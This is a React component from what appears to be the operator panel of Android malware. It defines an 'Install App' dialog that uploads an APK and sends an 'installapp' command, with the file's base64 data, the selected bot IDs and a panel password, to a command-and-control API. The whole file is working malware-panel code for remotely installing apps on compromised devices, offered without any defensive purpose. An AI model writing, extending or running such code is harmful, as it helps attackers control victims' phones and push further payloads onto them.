import React, { useState, useEffect, useRef } from 'react'
import SettingsContext from 'src/settings';
import NextLink from 'next/link';
import { Dialog, Box, FormControl,InputLabel, Switch, Select, MenuItem, Tooltip,ListItemAvatar, Avatar, DialogTitle, SvgIcon, DialogContent, Typography, Button, Grid, Item, Paper, List, ListItem, ListItemIcon, ListItemText} from '@mui/material';
import XCircleIcon from '@heroicons/react/24/solid/XCircleIcon';
import UserIcon from '@heroicons/react/24/solid/UserCircleIcon';
import Globe from '@heroicons/react/24/solid/GlobeEuropeAfricaIcon';
import Battery from '@heroicons/react/24/solid/Battery100Icon';
import { func } from 'prop-types';
import axios from "axios";
import $ from 'jquery';
import { Svg } from "react-svg";
import cheerio from "cheerio";

import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faWifi, faXmarkSquare, faMobile, faUser, faUserAltSlash, faClockRotateLeft, faCommentSlash, faKeyboard, faKey, faBug, faB, faEye, faEyeSlash, faUniversalAccess, faCommentSms, faBugSlash, faCalendarDays, faSms, faAddressBook, faMobileAndroid, faMobileScreen, faMobileAlt, faMobileAndroidAlt, faRectangleList, faArrowsRotate, faTrashCan, faPaperPlane, faLink } from '@fortawesome/free-solid-svg-icons';
import { borderRadius } from '@mui/system';

import TextField from '@mui/material/TextField';

import { toast } from 'react-toastify';

export default function InstallApp(props) {


    const { openPopup, setOpenPopup, selected} = props;
    const [data, setdata] = useState('');
    const [selectedFile, setSelectedFile] = useState(null);
    const [base64String, setBase64String] = useState('');

    const handleFileChange = (e) => {
        const file = e.target.files[0];
        if (file) {
          setSelectedFile(file);
          const reader = new FileReader();
          
          reader.onload = (e) => {
            const base64Data = e.target.result.split(',')[1];
            setBase64String(base64Data);
          };
          
          reader.readAsDataURL(file);

        } else {
          setSelectedFile(null);
          setBase64String('');
          alert('Please select an APK file.');
        }
      };
    


      function SendCommand(data) {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer(
                    '{"' + 
                    'request":"installapp",' + 
                    '"idbot":"' + selected.join(',') + '",' + 
                    '"app":"' + selectedFile.name + '","data":"' + base64String +
                    '","password":"' + SettingsContext.password + '"}').toString('base64')
            }
        });
    }
    
    return (
        
        <Dialog open={openPopup} onClose={() => setOpenPopup(false)} maxWidth="md">
            <DialogContent dividers>
                    <div style={{ display: "flex", justifyContent: "space-between"}}>

                    <Box
                    bgcolor="primary.main"
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    marginRight={2}
                    alignItems="center"
                    display="flex"
                    height={45}
                    width={220}
                >
                    <SvgIcon fontSize="medium">
                          <FontAwesomeIcon icon={faLink}/>
                        </SvgIcon>
                        <Typography ml={1} variant='h6' color="primary.contrastText" >Install App</Typography>
                        
                    </Box>

                    <Button
                        onClick={()=>{setOpenPopup(false)}}>
                        <FontAwesomeIcon icon={faXmarkSquare} size="2x"/>
                    </Button>
                    </div>

                    <input
                        type="file"
                        id="fileInput"
                        accept=".apk"
                        style={{ display: 'none' }}
                        onChange={handleFileChange}
                    />
                    <label htmlFor="fileInput">
                        <Button sx={{mt: 2}} variant="contained" component="span">
                        Upload File
                        </Button>
                    </label>
                    {selectedFile && <p>Selected App: {selectedFile.name}</p>}

                    <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
                    <Button onClick={()=> {if (selectedFile != null) { SendCommand(data); setOpenPopup(false); toast.success("Sent command to install " + selectedFile.name); } else { toast.error("You need to choose a apk before performing this action"); } }} sx={{mt: 3, width: 115, height: 42, }} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faPaperPlane} /></SvgIcon>)}variant="contained">Send</Button>
                    </div>
            </DialogContent>
        </Dialog>
    )
}
